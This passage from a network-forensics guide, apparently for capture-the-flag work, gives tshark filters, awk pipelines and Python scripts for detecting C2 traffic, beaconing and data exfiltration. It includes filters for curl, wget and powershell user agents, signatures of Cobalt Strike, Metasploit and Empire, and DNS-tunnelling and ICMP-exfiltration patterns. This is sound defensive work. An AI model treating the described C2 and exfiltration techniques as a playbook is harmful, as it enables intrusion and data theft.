            entropy = calculate_entropy(domain)
            if entropy > 3.5:  # High entropy threshold
                print(f"{entropy:.2f} - {line.strip()}")
EOF
```

**Fast-Flux Detection:**

```bash
# Multiple IP resolutions for same domain
tshark -r capture.pcap -Y "dns.flags.response == 1 && dns.a" \
  -T fields -e dns.qry.name -e dns.a | \
  awk '{print $1}' | sort | uniq -c | sort -rn

# High IP count for one domain indicates fast-flux
```

**DNS Tunneling Detection:**

```bash
# Large DNS queries (data exfiltration)
tshark -r capture.pcap -Y "dns.qry.name.len > 100" \
  -T fields -e ip.src -e dns.qry.name -e dns.qry.name.len

# High volume of DNS queries
tshark -r capture.pcap -Y "dns" -T fields -e ip.src | \
  sort | uniq -c | sort -rn

# Unusual record types
tshark -r capture.pcap -Y "dns.qry.type == 16" # TXT records
tshark -r capture.pcap -Y "dns.qry.type == 10" # NULL records
```

### HTTP/HTTPS C2 Detection

**Suspicious User-Agent Strings:**

```
# Generic or scripted user agents
http.user_agent contains "python" || http.user_agent contains "curl" || 
http.user_agent contains "wget" || http.user_agent contains "powershell"

# Empty user agents
http.request && !http.user_agent

# Unusual or outdated user agents
http.user_agent contains "MSIE 6.0"
```

**Extract User-Agents:**

```bash
# List unique user agents
tshark -r capture.pcap -Y "http.user_agent" \
  -T fields -e http.user_agent | sort -u

# Count by frequency
tshark -r capture.pcap -Y "http.user_agent" \
  -T fields -e http.user_agent | sort | uniq -c | sort -rn
```

**URI Path Analysis:**

```bash
# Extract HTTP URIs
tshark -r capture.pcap -Y "http.request" \
  -T fields -e http.host -e http.request.uri | sort -u

# Look for suspicious patterns:
# - Random-looking paths
# - Encoded data in URI
# - Known C2 patterns
```

**POST Request Analysis:**

```
# POST requests with no referer (potential C2 check-in)
http.request.method == "POST" && !http.referer

# Small POST requests (beaconing)
http.request.method == "POST" && http.content_length < 100

# Large POST requests (data exfiltration)
http.request.method == "POST" && http.content_length > 100000
```

**HTTP Response Analysis:**

```bash
# Extract response sizes
tshark -r capture.pcap -Y "http.response" \
  -T fields -e http.host -e http.content_length | \
  awk '{sum[$1]+=$2; count[$1]++} END {for (h in sum) print h, sum[h]/count[h]}'

# C2 responses often small and consistent
```

**SSL/TLS C2 Detection:**

```
# Self-signed certificates
tls.handshake.certificate

# Unusual certificate subjects
# Extract with: Export SSL certificate → View in wireshark

# JA3 fingerprinting
```

**JA3/JA3S Analysis:** [Inference] JA3 is a TLS client fingerprinting method that may help identify C2 tools based on their SSL/TLS implementation characteristics.

```bash
# Using ja3 tool (requires installation)
ja3 -r capture.pcap > ja3_hashes.txt

# Compare against known malware JA3 signatures
# Database: https://ja3er.com
```

### IRC C2 Detection

**IRC Protocol Indicators:**

```
# IRC commands
tcp.payload contains "NICK " || tcp.payload contains "JOIN #" || tcp.payload contains "PRIVMSG"

# Common IRC ports
tcp.port == 6667 || tcp.port == 6666 || tcp.port == 6668 || tcp.port == 6697
```

**Extract IRC Commands:**

```bash
# Follow IRC conversations
tshark -r capture.pcap -Y "tcp.port == 6667" -T fields -e tcp.payload | \
  xxd -r -p | strings | grep -E "^(NICK|USER|JOIN|PRIVMSG)"
```

### TCP C2 Detection

**Long-Lived Connections:**

```bash
# Find long duration connections
tshark -r capture.pcap -q -z conv,tcp | \
  awk 'NR>5 {print $6, $1, $3}' | sort -rn | head -20

# Duration in seconds, source, destination
```

**Persistent Connections:**

```
# Connections with periodic activity
tcp.stream eq [STREAM_NUM]

# Graph I/O to identify beaconing
Statistics → TCP Stream Graph → Time-Sequence Graph (Stevens)
```

**Custom Port C2:**

```bash
# Unusual ports with sustained traffic
tshark -r capture.pcap -Y "tcp" \
  -T fields -e tcp.dstport | sort | uniq -c | sort -rn

# High packet counts on non-standard ports
```

### Encoded/Encrypted Payloads

**Base64 in HTTP:**

```
# Base64-like strings in HTTP
http && http.file_data matches "[A-Za-z0-9+/]{50,}={0,2}"

# Extract and decode
tshark -r capture.pcap -Y "http" -T fields -e http.file_data | \
  grep -oE "[A-Za-z0-9+/]{50,}={0,2}" | base64 -d 2>/dev/null
```

**XOR-Encoded Traffic:** [Inference] XOR encoding produces high-entropy data that may be detectable through entropy analysis, though distinguishing it from legitimate encryption requires additional context.

```bash
# Extract payloads for entropy analysis
tshark -r capture.pcap -Y "tcp.len > 100" \
  -T fields -e tcp.payload | head -100 > payloads.txt

# Analyze entropy (using Python)
python3 << 'EOF'
import binascii
import math
from collections import Counter

def entropy(data):
    if not data:
        return 0
    entropy = 0
    for count in Counter(data).values():
        p = count / len(data)
        entropy -= p * math.log2(p)
    return entropy

with open('payloads.txt', 'r') as f:
    for line in f:
        try:
            data = binascii.unhexlify(line.strip().replace(':', ''))
            e = entropy(data)
            if 7.0 < e < 7.9:  # High but not maximum (compression/encryption)
                print(f"Entropy: {e:.2f} - Potential XOR encoding")
        except:
            continue
EOF
```

### C2 Traffic Volume Analysis

**Asymmetric Traffic:**

```bash
# Small uploads, large downloads (command/response)
tshark -r capture.pcap -q -z conv,tcp | \
  awk 'NR>5 {
    if ($4 < 1000 && $5 > 10000) 
      print "Asymmetric:", $1, "->", $3, "Out:", $4, "In:", $5
  }'
```

**Periodic Traffic:**

```bash
# Extract timestamps for specific connection
tshark -r capture.pcap -Y "tcp.stream eq NUM && tcp.len > 0" \
  -T fields -e frame.time_epoch | \
  awk 'NR>1 {print $1-prev} {prev=$1}' | \
  sort | uniq -c

# Consistent intervals indicate beaconing
```

### Behavioral Analysis

**Outbound Connections Analysis:**

```bash
# Internal hosts initiating external connections
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" \
  -T fields -e ip.src -e ip.dst | \
  awk '$1 ~ /^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/ && 
       $2 !~ /^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/ {print}' | \
  awk '{print $1}' | sort | uniq -c | sort -rn
```

**Geographic Analysis:**

```bash
# Extract external IPs
tshark -r capture.pcap -Y "ip.dst" -T fields -e ip.dst | \
  grep -vE "^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)" | \
  sort -u > external_ips.txt

# GeoIP lookup
for ip in $(cat external_ips.txt); do
    echo -n "$ip: "
    geoiplookup $ip 2>/dev/null | cut -d: -f2
done

# Connections to unusual countries may indicate C2
```

### Protocol Violations

**Malformed Packets:**

```
# TCP packets with unusual flag combinations
tcp.flags == 0x00 || tcp.flags == 0xff

# Invalid HTTP requests
http.request && !http.request.version
```

**Mismatched Protocol/Port:**

```
# HTTP traffic on non-standard ports
(tcp.port != 80 && tcp.port != 8080 && tcp.port != 443) && http

# SSH on non-22
tcp.port != 22 && tcp.payload[0:3] == 53:53:48  # "SSH"
```

### C2 Framework Signatures

**Cobalt Strike:**

```
# Default user agent
http.user_agent contains "Microsoft Internet Explorer"

# Malleable C2 profile indicators
# Default URI patterns
http.request.uri contains "/activity"  || http.request.uri contains "/load"

# JA3 Hash: 51c64c77e60f3980eea90869b68c58a8
```

**Metasploit:**

```
# Default Meterpreter HTTP beacon
http.request.uri == "/INITJM" || http.request.uri == "/INITM"

# Reverse HTTPS certificate subject
tls.handshake.extensions_server_name contains "wwww."  # Typo in default cert
```

**Empire:**

```
# Default user agents
http.user_agent contains "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0)"

# Default cookie names
http.cookie contains "session" || http.cookie contains "SESSIONID"
```

**PoshC2:**

```
# PowerShell specific patterns
http.request.uri contains ".php" && http.user_agent contains "Windows"

# Default URI patterns
http.request.uri matches "^/[a-z]{5}$"
```

### C2 Detection Script

**Comprehensive Python Detector:**

```python
#!/usr/bin/env python3
import pyshark
from collections import defaultdict
import statistics

def analyze_c2_patterns(pcap_file):
    """Detect potential C2 traffic"""
    
    # Track connection patterns
    connections = defaultdict(lambda: {
        'packets': [],
        'bytes_out': 0,
        'bytes_in': 0,
        'timestamps': [],
        'ports': set()
    })
    
    dns_queries = defaultdict(int)
    http_requests = defaultdict(list)
    
    cap = pyshark.FileCapture(pcap_file)
    
    for packet in cap:
        try:
            timestamp = float(packet.sniff_timestamp)
            
            # Analyze TCP connections
            if 'TCP' in packet:
                src = packet.ip.src
                dst = packet.ip.dst
                key = f"{src}->{dst}"
                
                connections[key]['packets'].append(timestamp)
                connections[key]['ports'].add(packet.tcp.dstport)
                
                if hasattr(packet.tcp, 'len'):
                    length = int(packet.tcp.len)
                    if src.startswith('192.168.') or src.startswith('10.'):
                        connections[key]['bytes_out'] += length
                    else:
                        connections[key]['bytes_in'] += length
            
            # Analyze DNS
            if 'DNS' in packet and hasattr(packet.dns, 'qry_name'):
                dns_queries[packet.dns.qry_name] += 1
            
            # Analyze HTTP
            if 'HTTP' in packet and hasattr(packet.http, 'request_uri'):
                host = packet.http.host if hasattr(packet.http, 'host') else 'unknown'
                ua = packet.http.user_agent if hasattr(packet.http, 'user_agent') else 'none'
                http_requests[host].append({
                    'uri': packet.http.request_uri,
                    'user_agent': ua,
                    'timestamp': timestamp
                })
                
        except AttributeError:
            continue
    
    cap.close()
    
    print("=== C2 Pattern Analysis ===\n")
    
    # Detect beaconing
    print("[*] Analyzing for beaconing behavior...")
    for conn, data in connections.items():
        if len(data['timestamps']) > 10:
            intervals = [data['timestamps'][i] - data['timestamps'][i-1] 
                        for i in range(1, len(data['timestamps']))]
            
            if intervals:
                mean_interval = statistics.mean(intervals)
                stdev_interval = statistics.stdev(intervals) if len(intervals) > 1 else 0
                
                # Regular intervals indicate beaconing
                if stdev_interval < mean_interval * 0.2 and mean_interval < 300:
                    print(f"\n[ALERT] Potential beaconing detected:")
                    print(f"  Connection: {conn}")
                    print(f"  Packets: {len(data['packets'])}")
                    print(f"  Interval: {mean_interval:.2f}s (±{stdev_interval:.2f}s)")
                    print(f"  Ports: {data['ports']}")
    
    # Detect suspicious DNS
    print("\n[*] Analyzing DNS queries...")
    for domain, count in dns_queries.items():
        if count > 100:
            print(f"\n[ALERT] High DNS query volume:")
            print(f"  Domain: {domain}")
            print(f"  Queries: {count}")
    
    # Detect suspicious HTTP
    print("\n[*] Analyzing HTTP traffic...")
    for host, requests in http_requests.items():
        if len(requests) > 50:
            user_agents = set(r['user_agent'] for r in requests)
            if len(user_agents) == 1:
                print(f"\n[ALERT] Repetitive HTTP requests:")
                print(f"  Host: {host}")
                print(f"  Requests: {len(requests)}")
                print(f"  User-Agent: {list(user_agents)[0]}")

if __name__ == "__main__":
    analyze_c2_patterns("capture.pcap")
```

## Beaconing Analysis

### Overview

Beaconing is a periodic communication pattern where malware contacts C2 servers at regular intervals. Detection focuses on identifying consistent time intervals, packet sizes, and communication patterns.

### Time-Based Beaconing Detection

**Extract Connection Timestamps:**

```bash
# Extract timestamps for specific host
tshark -r capture.pcap -Y "ip.src == SUSPICIOUS_IP && tcp.len > 0"  
-T fields -e frame.time_epoch > timestamps.txt

# Calculate intervals
awk 'NR>1 {print $1-prev} {prev=$1}' timestamps.txt > intervals.txt
````

**Statistical Analysis of Intervals:**
```bash
# Calculate mean and standard deviation
awk '{sum+=$1; sumsq+=$1*$1; count++} 
     END {
       mean=sum/count; 
       stdev=sqrt((sumsq/count)-(mean*mean)); 
       print "Mean:", mean, "StdDev:", stdev, "Coefficient:", stdev/mean
     }' intervals.txt

# Low coefficient of variation (< 0.3) indicates beaconing
````

**Interval Distribution:**

```bash
# Group intervals into buckets
awk '{bucket=int($1/10)*10; count[bucket]++} 
     END {for (b in count) print b"-"b+10"s:", count[b]}' intervals.txt | sort -n

# Tight clustering indicates regular beaconing
```

**Visualize Beacon Intervals:**

```bash
# Create histogram data
awk '{print int($1)}' intervals.txt | sort -n | uniq -c | \
awk '{printf "%s ", $1; for(i=0;i<$1;i++) printf "*"; printf "\n"}' | head -20

# Visual inspection of regularity
```

### Jitter Analysis

**Calculate Jitter:**

```bash
# Jitter = variation in intervals
awk 'NR>1 {jitter+=(prev>$1?prev-$1:$1-prev); count++} 
     {prev=$1} 
     END {print "Average Jitter:", jitter/count "s"}' intervals.txt

# Low jitter suggests automated beaconing
```

**Jitter Percentage:**

```bash
# Jitter as percentage of mean interval
awk '{sum+=$1; count++} END {mean=sum/count; print mean}' intervals.txt > mean.tmp
awk '{sum+=($1-mean)^2; count++} 
     END {stdev=sqrt(sum/count); print "Jitter %:", (stdev/mean)*100}' \
     mean=$(cat mean.tmp) intervals.txt
```

### Packet Size Beaconing

**Extract Packet Sizes:**

```bash
# Get packet sizes for connection
tshark -r capture.pcap -Y "ip.src == SUSPICIOUS_IP && tcp.len > 0" \
  -T fields -e tcp.len > packet_sizes.txt

# Analyze size consistency
awk '{sum+=$1; sumsq+=$1*$1; count++} 
     END {
       mean=sum/count; 
       stdev=sqrt((sumsq/count)-(mean*mean)); 
       print "Mean Size:", mean, "bytes, StdDev:", stdev
     }' packet_sizes.txt
```

**Size Distribution:**

```bash
# Count occurrences of each size
sort packet_sizes.txt | uniq -c | sort -rn | head -20

# Repeated identical sizes indicate beaconing
```

**Size-Time Correlation:**

```bash
# Extract both timestamp and size
tshark -r capture.pcap -Y "ip.src == SUSPICIOUS_IP && tcp.len > 0" \
  -T fields -e frame.time_epoch -e tcp.len | \
awk '{print $1, $2}' > time_size.txt

# Pattern analysis
awk 'NR>1 {
       interval=$1-prev_time; 
       if (interval > 0 && interval < 600) 
         print interval, $2
     } 
     {prev_time=$1}' time_size.txt > beacon_pattern.txt

# Look for repeated interval-size pairs
```

### HTTP/HTTPS Beaconing

**HTTP Request Beaconing:**

```bash
# Extract HTTP request timestamps
tshark -r capture.pcap -Y "http.request && ip.src == SUSPICIOUS_IP" \
  -T fields -e frame.time_epoch -e http.host -e http.request.uri

# Calculate intervals between requests
tshark -r capture.pcap -Y "http.request && ip.src == SUSPICIOUS_IP" \
  -T fields -e frame.time_epoch | \
awk 'NR>1 {print $1-prev} {prev=$1}' > http_intervals.txt
```

**User-Agent Consistency:**

```bash
# Check for consistent user agent (malware often uses same UA)
tshark -r capture.pcap -Y "http.request && ip.src == SUSPICIOUS_IP" \
  -T fields -e http.user_agent | sort | uniq -c

# Single user agent with many requests = suspicious
```

**URI Pattern Analysis:**

```bash
# Extract URI patterns
tshark -r capture.pcap -Y "http.request && ip.src == SUSPICIOUS_IP" \
  -T fields -e http.request.uri | sort | uniq -c | sort -rn

# Repeated identical URIs indicate automated beaconing
```

**HTTP Response Sizes:**

```bash
# Small consistent responses suggest beacon acknowledgments
tshark -r capture.pcap -Y "http.response && ip.dst == SUSPICIOUS_IP" \
  -T fields -e http.content_length | \
awk '{sum+=$1; count++} END {print "Avg Response:", sum/count, "bytes"}'
```

### DNS Beaconing

**DNS Query Timing:**

```bash
# Extract DNS query timestamps for domain
tshark -r capture.pcap -Y "dns.qry.name == \"suspicious.com\" && dns.flags.response == 0" \
  -T fields -e frame.time_epoch | \
awk 'NR>1 {print $1-prev} {prev=$1}' > dns_intervals.txt

# Analyze regularity
awk '{sum+=$1; count++} END {print "Mean DNS Query Interval:", sum/count, "s"}' dns_intervals.txt
```

**Subdomain Beaconing:**

```bash
# Extract subdomains (potential data exfil or C2)
tshark -r capture.pcap -Y "dns.flags.response == 0" \
  -T fields -e dns.qry.name | \
grep "suspicious\.com$" | \
awk -F. '{print $1}' | head -20

# Random-looking subdomains with regular queries = DGA or tunneling
```

### TCP Connection Beaconing

**Connection Establishment Pattern:**

```bash
# Track SYN packet timing to same destination
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0 && ip.dst == C2_IP" \
  -T fields -e frame.time_epoch | \
awk 'NR>1 {print $1-prev} {prev=$1}' > syn_intervals.txt

# Regular SYN intervals indicate periodic reconnection
```

**Data Transfer Pattern:**

```bash
# Extract data-carrying packet timing
tshark -r capture.pcap -Y "tcp.stream eq STREAM && tcp.len > 0" \
  -T fields -e frame.time_epoch -e tcp.len -e ip.src

# Analyze bidirectional pattern
awk '{
  if ($3 == internal_ip) out_time=$1; 
  else if (prev_out > 0) print $1-prev_out; 
  prev_out=out_time
}' internal_ip=192.168.1.100
```

### Advanced Beaconing Detection

**Fourier Analysis for Periodicity:**

```python
#!/usr/bin/env python3
import numpy as np
from scipy import fftpack
import matplotlib.pyplot as plt

def detect_periodicity(timestamps_file):
    """Use FFT to detect periodic beaconing"""
    
    # Load timestamps
    with open(timestamps_file) as f:
        timestamps = [float(line.strip()) for line in f]
    
    # Calculate intervals
    intervals = np.diff(timestamps)
    
    # Remove outliers
    mean = np.mean(intervals)
    std = np.std(intervals)
    filtered = intervals[np.abs(intervals - mean) < 3 * std]
    
    # Perform FFT
    fft = fftpack.fft(filtered)
    freqs = fftpack.fftfreq(len(filtered))
    
    # Find dominant frequency
    power = np.abs(fft)**2
    idx = np.argmax(power[1:]) + 1  # Exclude DC component
    dominant_freq = freqs[idx]
    period = 1.0 / abs(dominant_freq)
    
    print(f"[*] Detected period: {period:.2f} seconds")
    print(f"[*] Confidence: {power[idx]/np.sum(power)*100:.1f}%")
    
    # Visualization
    plt.figure(figsize=(12, 4))
    plt.subplot(1, 2, 1)
    plt.plot(intervals)
    plt.title('Beacon Intervals')
    plt.xlabel('Beacon Number')
    plt.ylabel('Interval (s)')
    
    plt.subplot(1, 2, 2)
    plt.plot(freqs[:len(freqs)//2], power[:len(power)//2])
    plt.title('Frequency Spectrum')
    plt.xlabel('Frequency (Hz)')
    plt.ylabel('Power')
    plt.savefig('beacon_analysis.png')
    print("[+] Saved analysis to beacon_analysis.png")

if __name__ == "__main__":
    detect_periodicity("timestamps.txt")
```

**Entropy-Based Beacon Detection:**

```python
#!/usr/bin/env python3
import numpy as np
from scipy.stats import entropy

def analyze_beacon_entropy(intervals_file):
    """Low entropy in intervals suggests beaconing"""
    
    with open(intervals_file) as f:
        intervals = [float(line.strip()) for line in f]
    
    # Bin intervals
    hist, bin_edges = np.histogram(intervals, bins=20)
    
    # Calculate entropy
    hist = hist + 1  # Avoid log(0)
    prob = hist / hist.sum()
    ent = entropy(prob)
    max_ent = np.log(len(prob))
    
    normalized_entropy = ent / max_ent
    
    print(f"[*] Normalized Entropy: {normalized_entropy:.3f}")
    
    if normalized_entropy < 0.5:
        print("[ALERT] Low entropy detected - likely beaconing")
        print(f"[*] Most common interval: {np.median(intervals):.2f}s")
    elif normalized_entropy < 0.7:
        print("[WARNING] Moderate entropy - possible beaconing with jitter")
    else:
        print("[INFO] High entropy - irregular traffic pattern")

if __name__ == "__main__":
    analyze_beacon_entropy("intervals.txt")
```

**Machine Learning Approach:**

```python
#!/usr/bin/env python3
from sklearn.cluster import DBSCAN
import numpy as np

def ml_beacon_detection(timestamps_file):
    """Use clustering to identify beacon groups"""
    
    with open(timestamps_file) as f:
        timestamps = np.array([float(line.strip()) for line in f])
    
    intervals = np.diff(timestamps)
    
    # Reshape for sklearn
    X = intervals.reshape(-1, 1)
    
    # DBSCAN clustering
    clustering = DBSCAN(eps=5, min_samples=5).fit(X)
    
    labels = clustering.labels_
    n_clusters = len(set(labels)) - (1 if -1 in labels else 0)
    
    print(f"[*] Found {n_clusters} clusters")
    
    # Analyze largest cluster
    if n_clusters > 0:
        largest_cluster = np.bincount(labels[labels >= 0]).argmax()
        cluster_intervals = intervals[labels == largest_cluster]
        
        print(f"\n[*] Largest cluster (potential beacon):")
        print(f"    Size: {len(cluster_intervals)} intervals")
        print(f"    Mean: {np.mean(cluster_intervals):.2f}s")
        print(f"    StdDev: {np.std(cluster_intervals):.2f}s")
        
        if np.std(cluster_intervals) / np.mean(cluster_intervals) < 0.2:
            print("[ALERT] Highly regular cluster - beaconing detected!")

if __name__ == "__main__":
    ml_beacon_detection("timestamps.txt")
```

### Sleep Timer Evasion Detection

**Variable Interval Beaconing:**

```bash
# Malware may use jitter to avoid detection
# Look for intervals clustering around multiple values

awk '{bucket=int($1/60); count[bucket]++} 
     END {for (b in count) if (count[b] > 5) print b*60"s:", count[b]}' \
     intervals.txt | sort -n

# Multiple strong peaks suggest jittered beaconing
```

**Exponential Backoff Detection:**

```bash
# Some malware increases interval after failed connections
# Look for increasing interval trend

awk '{print NR, $1}' intervals.txt | head -50

# Manual inspection for exponential growth pattern
```

### Protocol-Specific Beaconing

**ICMP Beaconing:**

```bash
# ICMP-based C2 (less common but exists)
tshark -r capture.pcap -Y "icmp.type == 8 && ip.src == SUSPICIOUS_IP" \
  -T fields -e frame.time_epoch | \
awk 'NR>1 {print $1-prev} {prev=$1}' > icmp_intervals.txt

# Regular ICMP echo requests = potential C2
```

**SMB/RPC Beaconing:**

```bash
# Windows-specific protocols
tshark -r capture.pcap -Y "smb2 && ip.src == SUSPICIOUS_IP" \
  -T fields -e frame.time_epoch | \
awk 'NR>1 {print $1-prev} {prev=$1}'

# Regular SMB traffic to external IP = suspicious
```

### Comprehensive Beacon Detection Script

**Bash-Based Detector:**

```bash
#!/bin/bash

PCAP="$1"
OUTPUT_DIR="beacon_analysis"
THRESHOLD=10  # Minimum packets for analysis

mkdir -p "$OUTPUT_DIR"

echo "=== Beaconing Detection Analysis ==="
echo

# Extract all unique IP pairs with significant traffic
tshark -r "$PCAP" -Y "tcp.len > 0" -T fields -e ip.src -e ip.dst 2>/dev/null | \
  awk '{print $1, $2}' | sort | uniq -c | \
  awk -v thresh="$THRESHOLD" '$1 > thresh {print $2, $3}' | \
while read src dst; do
    
    echo "[*] Analyzing: $src -> $dst"
    
    # Extract timestamps
    tshark -r "$PCAP" -Y "ip.src == $src && ip.dst == $dst && tcp.len > 0" \
      -T fields -e frame.time_epoch 2>/dev/null > "$OUTPUT_DIR/timestamps_${src}_${dst}.txt"
    
    # Calculate intervals
    awk 'NR>1 {print $1-prev} {prev=$1}' "$OUTPUT_DIR/timestamps_${src}_${dst}.txt" > \
      "$OUTPUT_DIR/intervals_${src}_${dst}.txt"
    
    # Statistical analysis
    stats=$(awk '{sum+=$1; sumsq+=$1*$1; count++} 
                 END {
                   if (count > 0) {
                     mean=sum/count; 
                     stdev=sqrt((sumsq/count)-(mean*mean)); 
                     cv=stdev/mean;
                     print mean, stdev, cv
                   }
                 }' "$OUTPUT_DIR/intervals_${src}_${dst}.txt")
    
    if [ -n "$stats" ]; then
        mean=$(echo $stats | awk '{print $1}')
        stdev=$(echo $stats | awk '{print $2}')
        cv=$(echo $stats | awk '{print $3}')
        
        # Beaconing detection criteria
        is_beacon=$(echo "$cv" | awk '{if ($1 < 0.3 && $1 > 0) print "YES"; else print "NO"}')
        
        if [ "$is_beacon" = "YES" ]; then
            echo "  [ALERT] Potential beacon detected!"
            echo "  Mean interval: ${mean}s"
            echo "  Standard deviation: ${stdev}s"
            echo "  Coefficient of variation: $cv"
            echo
        fi
    fi
done

echo "[+] Analysis complete. Results in $OUTPUT_DIR/"
```

## Exfiltration Detection

### Overview

Data exfiltration involves unauthorized transfer of sensitive data from a network. Detection focuses on identifying unusual data volumes, destinations, protocols, and timing patterns.

### Volume-Based Detection

**Identify High-Volume Transfers:**

```bash
# Total bytes transferred per connection
tshark -r capture.pcap -q -z conv,tcp | \
  awk 'NR>5 {
    bytes=$4+$5; 
    if (bytes > 1000000) 
      print bytes, $1, "->", $3
  }' | sort -rn

# Connections over 1MB
```

**Bytes per Second Analysis:**

```bash
# Calculate transfer rate
tshark -r capture.pcap -Y "tcp.stream eq STREAM" \
  -T fields -e frame.time_epoch -e tcp.len | \
awk 'NR==1{start=$1} 
     {bytes+=$2; end=$1} 
     END{duration=end-start; print bytes, "bytes in", duration, "s =", bytes/duration, "bytes/s"}'
```

**Upload vs Download Ratio:**

```bash
# Identify internal IPs with high upload
tshark -r capture.pcap -q -z conv,tcp | \
awk 'NR>5 {
  if ($1 ~ /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)/) {
    upload=$4; download=$5;
    ratio=upload/(download+1);
    if (ratio > 2 && upload > 100000)
      print $1, "Upload:", upload, "Download:", download, "Ratio:", ratio
  }
}'
```

**Unusual Time-of-Day Transfers:**

```bash
# Transfers during off-hours (e.g., 10pm - 6am)
tshark -r capture.pcap -Y "tcp" -T fields \
  -e frame.time -e ip.src -e ip.dst -e tcp.len | \
awk '{
  hour=substr($1, 12, 2);
  if ((hour >= 22 || hour < 6) && $4 > 10000)
    print $0
}'
```

### Protocol-Based Exfiltration

**DNS Exfiltration Detection:**

```bash
# Long DNS queries (data in subdomain)
tshark -r capture.pcap -Y "dns.qry.name.len > 50" \
  -T fields -e ip.src -e dns.qry.name -e dns.qry.name.len | \
sort -u

# High volume of DNS queries
tshark -r capture.pcap -Y "dns.flags.response == 0" \
  -T fields -e ip.src | sort | uniq -c | sort -rn | head -10
```

**DNS Query Character Analysis:**

```bash
# Extract queries for entropy analysis
tshark -r capture.pcap -Y "dns.flags.response == 0" \
  -T fields -e dns.qry.name > dns_queries.txt

# Check for Base32/Base64 encoded data in subdomains
grep -E "^[A-Z0-9]{30,}" dns_queries.txt

# Hex-encoded data
grep -E "^[0-9a-f]{40,}" dns_queries.txt
```

**DNS TXT Record Exfiltration:**

```bash
# TXT queries (can hold more data)
tshark -r capture.pcap -Y "dns.qry.type == 16" \
  -T fields -e ip.src -e dns.qry.name | sort -u

# TXT responses (data retrieval)
tshark -r capture.pcap -Y "dns.txt" \
  -T fields -e dns.qry.name -e dns.txt
```

**HTTP POST Exfiltration:**

```bash
# Large POST requests
tshark -r capture.pcap -Y "http.request.method == POST && http.content_length > 100000" \
  -T fields -e ip.src -e http.host -e http.content_length

# Frequent small POSTs (chunked exfil)
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e ip.src -e http.host | sort | uniq -c | sort -rn
```

**HTTP POST Data Extraction:**

```bash
# Extract POST data for analysis
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e http.file_data | head -5 | xxd

# Check for Base64-encoded data
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e http.file_data | \
grep -oE "[A-Za-z0-9+/]{100,}={0,2}" | base64 -d 2>/dev/null | strings
```

**HTTPS Exfiltration Indicators:**

```
# High upload volume over HTTPS
tcp.port == 443 && tcp.len > 1000

# Extract connection metadata
tshark -r capture.pcap -Y "ssl.handshake.type == 1" \
  -T fields -e ip.src -e ip.dst -e tls.handshake.extensions_server_name
```

**SSL Certificate Analysis:**

```bash
# Self-signed certificates (potential attacker infrastructure)
tshark -r capture.pcap -Y "tls.handshake.certificate" \
  -T fields -e x509sat.uTF8String -e x509ce.dNSName

# Check certificate validity period
# Short-lived certs may indicate malicious infrastructure
```

### ICMP Exfiltration

**ICMP Payload Analysis:**

```bash
# ICMP packets with data
tshark -r capture.pcap -Y "icmp && icmp.data" \
  -T fields -e ip.src -e ip.dst -e icmp.data | head -20

# Normal ICMP echo has standard payload
# Unusual data suggests exfiltration
```

**ICMP Data Extraction:**

```bash
# Extract and analyze ICMP payloads
tshark -r capture.pcap -Y "icmp.type == 8 && ip.src == INTERNAL_IP" \
  -T fields -e icmp.data | \
xxd -r -p | strings

# Look for file headers, text data
```

**ICMP Packet Size Analysis:**

```bash
# Standard ping is usually 64 bytes
# Larger payloads are suspicious
tshark -r capture.pcap -Y "icmp" \
  -T fields -e frame.len | \
awk '{count[$1]++} END {for (size in count) print size, count[size]}' | sort -n
```

### FTP/SFTP Exfiltration

**FTP Upload Detection:**

```bash
# FTP STOR commands
tshark -r capture.pcap -Y "ftp.request.command == STOR" \
  -T fields -e ip.src -e ftp.request.arg

# Extract transferred files
# File → Export Objects → FTP-DATA
```

**SFTP Detection:**

```bash
# SSH file transfer activity
tshark -r capture.pcap -Y "tcp.port == 22" -q -z conv,tcp | \
awk 'NR>5 {if ($4 > 1000000) print $1, "->", $3, ":", $4, "bytes"}'

# Large transfers over SSH port
```

### Email Exfiltration

**Large Email Attachments:**

```bash
# SMTP with large DATA
tshark -r capture.pcap -Y "smtp.data.fragment" \
  -T fields -e frame.len | \
awk '{sum+=$1} END {print "Total SMTP data:", sum, "bytes"}'

# Extract email content
tshark -r capture.pcap -Y "smtp" -T fields -e text | grep -i "content-type"
```

**Email Volume Analysis:**

```bash
# Count emails sent per internal host
tshark -r capture.pcap -Y "smtp.req.command == MAIL" \
  -T fields -e ip.src -e smtp.req.parameter | \
awk '{print $1}' | sort | uniq -c | sort -rn
```

### Cloud Storage Exfiltration

**Dropbox Traffic:**

```bash
# Dropbox domains
tshark -r capture.pcap -Y "http.host contains dropbox" \
  -T fields -e ip.src -e http.host -e http.request.uri

# Upload detection
tshark -r capture.pcap -Y "http.host contains dropbox && http.request.method == POST" \
  -T fields -e ip.src -e http.content_length
```

**Google Drive:**

```bash
# Google Drive uploads
tshark -r capture.pcap -Y "http.host contains \"drive.google.com\"" \
  -T fields -e ip.src -e http.request.method -e http.content_length | \
grep POST
```

**OneDrive:**

```bash
# OneDrive traffic
tshark -r capture.pcap -Y "http.host contains \"onedrive\"" \
  -T fields -e ip.src -e http.host -e http.request.method
```

### Steganographic Exfiltration

**Image Upload Analysis:**

```bash
# HTTP image uploads
tshark -r capture.pcap -Y "http.request.method == POST && http.content_type contains image" \
  -T fields -e ip.src -e http.host -e http.content_length

# Extract images
# File → Export Objects → HTTP
# Filter by content-type: image
```

**Image Metadata Analysis:**

```bash
# After extracting images
for img in extracted_images/*; do
    echo "=== $img ==="
    exiftool "$img" | grep -i comment
    strings "$img" | grep -i "flag\|password\|secret"
done
```

### Compressed Data Exfiltration

**Compressed File Transfers:**

```bash
# Look for ZIP/RAR/7z transfers
tshark -r capture.pcap -Y "http" -T fields -e http.content_type | \
grep -iE "(zip|rar|7z|compressed)"

# Extract archives
# File → Export Objects → HTTP
# Filter by extension or MIME type
```

**Archive Analysis:**

```bash
# List archive contents
for archive in *.zip; do
    echo "=== $archive ==="
    unzip -l "$archive"
done

# Check for encrypted archives
